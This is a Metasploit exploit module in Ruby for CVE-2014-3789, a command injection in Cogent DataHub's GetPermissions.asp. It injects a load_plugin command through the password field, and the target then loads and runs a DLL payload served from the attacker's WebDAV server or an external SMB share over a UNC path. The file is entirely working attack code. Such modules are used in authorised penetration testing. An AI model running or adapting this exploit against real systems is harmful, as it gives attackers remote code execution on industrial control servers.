# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  # Exploitation is reliable, but the service hangs and needs manual restarting.
  Rank = ManualRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
 
  def initialize
    super(
      &#039;Name&#039;          => &#039;Cogent DataHub Command Injection&#039;,
      &#039;Description&#039;   => %q{
        This module exploits an injection vulnerability in Cogent DataHub prior
        to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which
        makes insecure use of the datahub_command function with user controlled
        data, allowing execution of arbitrary datahub commands and scripts. This
        module has been tested successfully with Cogent DataHub 7.3.4 on
        Windows 7 SP1.
      },
      &#039;Author&#039;      => [
        &#039;John Leitch&#039;, # Vulnerability discovery
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;References&#039;  =>
        [
          [&#039;ZDI&#039;, &#039;14-136&#039;],
          [&#039;CVE&#039;, &#039;2014-3789&#039;],
          [&#039;BID&#039;, &#039;67486&#039;]
        ],
      &#039;Stance&#039;      => Msf::Exploit::Stance::Aggressive,
      &#039;DefaultOptions&#039; => {
        &#039;WfsDelay&#039; => 30,
        &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
      },
      &#039;Targets&#039;     =>
        [
          [ &#039;Cogent DataHub < 7.3.5&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 29 2014&#039;
    )
    register_options(
      [
        OptString.new(&#039;URIPATH&#039;,   [ true,  &#039;The URI to use (do not change)&#039;, &#039;/&#039;]),
        OptPort.new(&#039;SRVPORT&#039;,     [ true,  &#039;The daemon port to listen on &#039; +
                                                      &#039;(do not change)&#039;, 80 ]),
        OptInt.new(&#039;WEBDAV_DELAY&#039;, [ true,  &#039;Time that the HTTP Server will &#039; +
                                          &#039;wait for the payload request&#039;, 20]),
        OptString.new(&#039;UNCPATH&#039;,   [ false, &#039;Override the UNC path to use.&#039; ])
      ], self.class)
  end
 
  def autofilter
    false
  end
 
  def on_request_uri(cli, request)
    case request.method
      when &#039;OPTIONS&#039;
        process_options(cli, request)
      when &#039;PROPFIND&#039;
        process_propfind(cli, request)
      when &#039;GET&#039;
        process_get(cli, request)
      else
        vprint_status("#{request.method} => 404 (#{request.uri})")
        resp = create_response(404, "Not Found")
        resp.body = ""
        resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
        cli.send_response(resp)
    end
  end
 
  def process_get(cli, request)
 
    if blacklisted_path?(request.uri)
      vprint_status("GET => 404 [BLACKLIST] (#{request.uri})")
      resp = create_response(404, "Not Found")
      resp.body = ""
      cli.send_response(resp)
      return
    end
 
    if request.uri.include?(@basename)
      print_status("GET => Payload")
      return if ((p = regenerate_payload(cli)) == nil)
      data = generate_payload_dll({ :code => p.encoded })
      send_response(cli, data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
      return
    end
 
    # Treat index.html specially
    if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
      vprint_status("GET => REDIRECT (#{request.uri})")
      resp = create_response(200, "OK")
 
      resp.body  = %Q|<html><head><meta http-equiv="refresh" content="0;URL=|
      resp.body += %Q|#{@exploit_unc}#{@share_name}\\"></head><body></body></html>|
      resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
      cli.send_response(resp)
      return
    end
 
    # Anything else is probably a request for a data file...
    vprint_status("GET => DATA (#{request.uri})")
    data = rand_text_alpha(4 + rand(4))
    send_response(cli, data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
  end
 
  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request)
    vprint_status("OPTIONS #{request.uri}")
    headers = {
      &#039;MS-Author-Via&#039; => &#039;DAV&#039;,
      &#039;DASL&#039;          => &#039;<DAV:sql>&#039;,
      &#039;DAV&#039;           => &#039;1, 2&#039;,
      &#039;Allow&#039;         => &#039;OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY,&#039; +
                    + &#039; MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH&#039;,
      &#039;Public&#039;        => &#039;OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, &#039; +
                    + &#039;LOCK, UNLOCK&#039;,
      &#039;Cache-Control&#039; => &#039;private&#039;
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp[&#039;Content-Type&#039;] = &#039;text/xml&#039;
    cli.send_response(resp)
  end
 
  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request)
    path = request.uri
    vprint_status("PROPFIND #{path}")
 
    if path !~ /\/$/
 
      if blacklisted_path?(path)
        vprint_status "PROPFIND => 404 (#{path})"
        resp = create_response(404, "Not Found")
        resp.body = ""
        cli.send_response(resp)
        return
      end
 
      if path.index(".")
        vprint_status "PROPFIND => 207 File (#{path})"
        body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp[&#039;Content-Type&#039;] = &#039;text/xml; charset="utf8"&#039;
        cli.send_response(resp)
        return
      else
        vprint_status "PROPFIND => 301 (#{path})"
        resp = create_response(301, "Moved")
        resp["Location"] = path + "/"
        resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
        cli.send_response(resp)
        return
      end
    end
 
    vprint_status "PROPFIND => 207 Directory (#{path})"
    body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
  <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
    <D:href>#{path}</D:href>
    <D:propstat>
      <D:prop>
        <lp1:resourcetype><D:collection/></lp1:resourcetype>
        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
        <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
        <D:supportedlock>
          <D:lockentry>
            <D:lockscope><D:exclusive/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
          </D:lockentry>
          <D:lockentry>
            <D:lockscope><D:shared/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
          </D:lockentry>
        </D:supportedlock>
        <D:lockdiscovery/>
        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>
      </D:prop>
    <D:status>HTTP/1.1 200 OK</D:status>
  </D:propstat>
</D:response>
|
 
    if request["Depth"].to_i > 0
      trail = path.split("/")
      trail.shift
      case trail.length
        when 0
          body << generate_shares(path)
        when 1
          body << generate_files(path)
      end
    else
      vprint_status "PROPFIND => 207 Top-Level Directory"
    end
 
    body << "</D:multistatus>"
 
    body.gsub!(/\t/, &#039;&#039;)
 
    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp[&#039;Content-Type&#039;] = &#039;text/xml; charset="utf8"&#039;
    cli.send_response(resp)
  end
 
  def generate_shares(path)
    share_name = @share_name
    %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end
 
  def generate_files(path)
    trail = path.split("/")
    return "" if trail.length < 2
 
    base  = @basename
    exts  = @extensions.gsub(",", " ").split(/\s+/)
    files = ""
    exts.each do |ext|
      files << %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{base}.#{ext}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
<D:ishidden b:dt="boolean">1</D:ishidden>
</D:propstat>
</D:response>
|
    end
 
    files
  end
 
  def gen_timestamp(ttype=nil)
    ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
  end
 
  def gen_datestamp(ttype=nil)
    ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
  end
 
  # This method rejects requests that are known to break exploitation
  def blacklisted_path?(uri)
    share_path = "/#{@share_name}"
    payload_path = "#{share_path}/#{@basename}.dll"
    case uri
      when payload_path
        return false
      when share_path
        return false
      else
        return true
    end
  end
 
  def check
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(&#039;/&#039;, &#039;Silverlight&#039;, &#039;GetPermissions.asp&#039;),
      &#039;vars_post&#039; =>
        {
          &#039;username&#039; => rand_text_alpha(4 + rand(4)),
          &#039;password&#039; => rand_text_alpha(4 + rand(4))
        }
      })
 
    if res && res.code == 200 && res.body =~ /PermissionRecord/
        return Exploit::CheckCode::Detected
    end
 
    Exploit::CheckCode::Safe
  end
 
  def send_injection(dll)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(&#039;/&#039;, &#039;Silverlight&#039;, &#039;GetPermissions.asp&#039;),
      &#039;vars_post&#039; =>
        {
          &#039;username&#039; => rand_text_alpha(3 + rand(3)),
          &#039;password&#039; => "#{rand_text_alpha(3 + rand(3))}\")" +
                        "(load_plugin \"#{dll}\" 1)(\""
        }
      }, 1)
 
    res
  end
 
  def on_new_session(session)
    if service
      service.stop
    end
 
    super
  end
 
  def primer
    print_status("#{peer} - Sending injection...")
    res = send_injection("\\\\\\\\#{@myhost}\\\\#{@share_name}\\\\#{@basename}.dll")
    if res
      print_error("#{peer} - Unexpected answer")
    end
  end
 
  def exploit
    if datastore[&#039;UNCPATH&#039;].blank?
      @basename = rand_text_alpha(3)
      @share_name = rand_text_alpha(3)
      @extensions = "dll"
      @system_commands_file = rand_text_alpha_lower(4)
 
      if (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;)
        @myhost = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
      else
        @myhost = datastore[&#039;SRVHOST&#039;]
      end
 
      @exploit_unc  = "\\\\#{@myhost}\\"
 
      if datastore[&#039;SRVPORT&#039;].to_i != 80 || datastore[&#039;URIPATH&#039;] != &#039;/&#039;
        fail_with(Failure::BadConfig, &#039;Using WebDAV requires SRVPORT=80 and &#039; +
                  &#039;URIPATH=/&#039;)
      end
 
      print_status("Starting Shared resource at #{@exploit_unc}#{@share_name}" +
                    "\\#{@basename}.dll")
 
      begin
        # The Windows Webclient needs some time...
        Timeout.timeout(datastore[&#039;WEBDAV_DELAY&#039;]) { super }
      rescue ::Timeout::Error
        service.stop if service
      end
    else
      # Using external SMB Server
      if datastore[&#039;UNCPATH&#039;] =~ /\\\\([^\\]*)\\([^\\]*)\\([^\\]*\.dll)/
        host = $1
        share_name = $2
        dll_name = $3
        print_status("#{peer} - Sending injection...")
        res = send_injection("\\\\\\\\#{host}\\\\#{share_name}\\\\#{dll_name}")
        if res
          print_error("#{peer} - Unexpected answer")
        end
      else
        fail_with(Failure::BadConfig, &#039;Bad UNCPATH format, should be &#039; +
                  &#039;\\\\host\\shared_folder\\base_name.dll&#039;)
      end
    end
  end
 
end

